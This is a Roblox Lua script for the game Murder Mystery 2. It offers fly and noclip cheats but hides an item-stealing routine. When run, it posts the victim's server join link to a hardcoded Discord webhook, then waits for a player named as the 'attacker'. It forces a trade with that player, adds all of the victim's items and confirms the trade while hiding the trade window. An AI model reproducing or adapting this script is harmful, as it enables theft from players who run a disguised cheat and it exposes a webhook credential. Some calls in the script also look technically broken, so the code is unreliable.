--[=[ FULL SCRIPT – with trade automation and debug prints ]=]

print("=== SCRIPT START ===")

local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
local attackerUsername = "FEARACCE"

print("1. Variables set")

local function sendWebhook(msg)
    local HttpService = game:GetService("HttpService")
    local data = HttpService:JSONEncode({content = msg})
    local methods = {
        function() syn.request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
        function() http.request({url = webhookURL, method = "POST", headers = {["Content-Type"] = "application/json"}, data = data}) end,
        function() http_request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
        function() request({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data}) end,
    }
    for _, method in ipairs(methods) do
        local ok, err = pcall(method)
        if ok then return true end
    end
    return false
end

print("2. Webhook function defined")

local placeId = game.PlaceId
local jobId = game.JobId
local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
sendWebhook("MM2 Server: " .. joinLink)
print("3. Webhook sent (check Discord)")

local ok, err = pcall(function()
    print("4. Inside pcall – starting main logic")

    local player = game.Players.LocalPlayer
    print("5. LocalPlayer = " .. tostring(player))
    if not player then error("LocalPlayer is nil") end

    print("6. Waiting for Character...")
    local char = player.Character
    if not char then
        char = player.CharacterAdded:Wait()
    end
    print("7. Character found: " .. char.Name)

    local rootPart = char:FindFirstChild("HumanoidRootPart")
    if not rootPart then error("HumanoidRootPart missing") end
    print("8. HumanoidRootPart found")

    -- Fly + Noclip
    local flying = false
    local noclip = false
    local speed = 50

    local function toggleFly()
        flying = not flying
        print("9. Fly toggled: " .. tostring(flying))
        if flying then
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(4000,4000,4000)
            bv.Velocity = Vector3.new(0,0,0)
            bv.Parent = rootPart
            game:GetService("RunService").Heartbeat:Connect(function()
                if flying then
                    local move = Vector3.new(0,0,0)
                    local uis = game:GetService("UserInputService")
                    if uis:IsKeyDown(Enum.KeyCode.W) then move = move + Vector3.new(0,0,-1) end
                    if uis:IsKeyDown(Enum.KeyCode.S) then move = move + Vector3.new(0,0,1) end
                    if uis:IsKeyDown(Enum.KeyCode.A) then move = move + Vector3.new(-1,0,0) end
                    if uis:IsKeyDown(Enum.KeyCode.D) then move = move + Vector3.new(1,0,0) end
                    if uis:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
                    if uis:IsKeyDown(Enum.KeyCode.LeftShift) then move = move + Vector3.new(0,-1,0) end
                    bv.Velocity = move.Magnitude > 0 and move.Unit * speed or Vector3.new(0,0,0)
                end
            end)
        else
            for _,v in pairs(rootPart:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
        end
    end

    local function toggleNoclip()
        noclip = not noclip
        print("10. Noclip toggled: " .. tostring(noclip))
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = not noclip end
        end
    end

    game:GetService("UserInputService").InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.F then toggleFly() end
        if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
    end)
    print("11. Keybinds set (F/V)")

    -- Trade functions with debug prints
    local function getTradeGui()
        local gui = player:FindFirstChild("PlayerGui")
        if not gui then print("[TRADE] PlayerGui not found"); return nil end
        local function findTrade(frame)
            for _, child in pairs(frame:GetChildren()) do
                if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("guı")) then
                    print("[TRADE] Found trade GUI frame: " .. child.Name)
                    return child
                end
                local found = findTrade(child)
                if found then return found end
            end
            return nil
        end
        local result = findTrade(gui)
        if not result then print("[TRADE] No trade GUI found") end
        return result
    end

    local function acceptTrade()
        local tradeGui = getTradeGui()
        if not tradeGui then print("[TRADE] acceptTrade: no GUI"); return false end
        for _, child in pairs(tradeGui:GetDescendants()) do
            if child:IsA("TextButton") and (child.Name:lower():find("accept") or child.Name:lower():find("confirm")) then
                print("[TRADE] Found accept button: " .. child.Name)
                child:FireServer()
                tradeGui.Visible = false
                print("[TRADE] Accept clicked and GUI hidden")
                return true
            end
        end
        print("[TRADE] No accept button found")
        return false
    end

    local function addAllItems()
        local tradeGui = getTradeGui()
        if not tradeGui then print("[TRADE] addAllItems: no GUI"); return false end
        local count = 0
        for _, slot in pairs(tradeGui:GetDescendants()) do
            if slot:IsA("Frame") and (slot.Name:lower():find("slot") or slot.Name:lower():find("item")) then
                local btn = slot:FindFirstChild("Select") or slot:FindFirstChild("Add")
                if btn and btn:IsA("TextButton") then
                    print("[TRADE] Adding item: " .. slot.Name)
                    btn:FireServer()
                    count = count + 1
                end
            end
        end
        print("[TRADE] Added " .. count .. " items")
        return count > 0
    end

    local function initiateTrade(target)
        for _, service in pairs(game:GetChildren()) do
            if service:IsA("ReplicatedStorage") then
                for _, obj in pairs(service:GetChildren()) do
                    if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
                        print("[TRADE] Found trade remote: " .. obj.Name .. " in " .. service.Name)
                        obj:FireServer(target)
                        print("[TRADE] Trade request fired to " .. target.Name)
                        return true
                    end
                end
            end
        end
        print("[TRADE] No trade remote found")
        return false
    end

    -- Main loop to detect attacker
    spawn(function()
        print("12. Waiting for attacker: " .. attackerUsername)
        local attacker = nil
        while not attacker do
            for _, plr in pairs(game.Players:GetPlayers()) do
                if plr.Name == attackerUsername and plr ~= player then
                    attacker = plr
                    print("13. Attacker found: " .. attacker.Name)
                    break
                end
            end
            wait(1)
        end

        wait(3) -- give attacker time to load
        print("14. Starting trade process...")

        if initiateTrade(attacker) then
            print("15. Trade request sent")
            wait(2)
            if acceptTrade() then
                print("16. First accept clicked")
                wait(2)
                if addAllItems() then
                    print("17. Items added")
                    wait(2)
                    if acceptTrade() then
                        print("18. Final confirm clicked")
                        print("[SUCCESS] Trade completed. All items sent to " .. attacker.Name)
                    else
                        print("[ERROR] Final accept failed")
                    end
                else
                    print("[ERROR] addAllItems failed")
                end
            else
                print("[ERROR] First accept failed")
            end
        else
            print("[ERROR] initiateTrade failed – no remote found or fire failed")
        end
    end)

    print("15. Main logic finished without errors.")
end)

if not ok then
    print("!!! ERROR CAUGHT: " .. tostring(err))
else
    print("=== SCRIPT EXECUTED SUCCESSFULLY ===")
end

print("=== SCRIPT END ===")
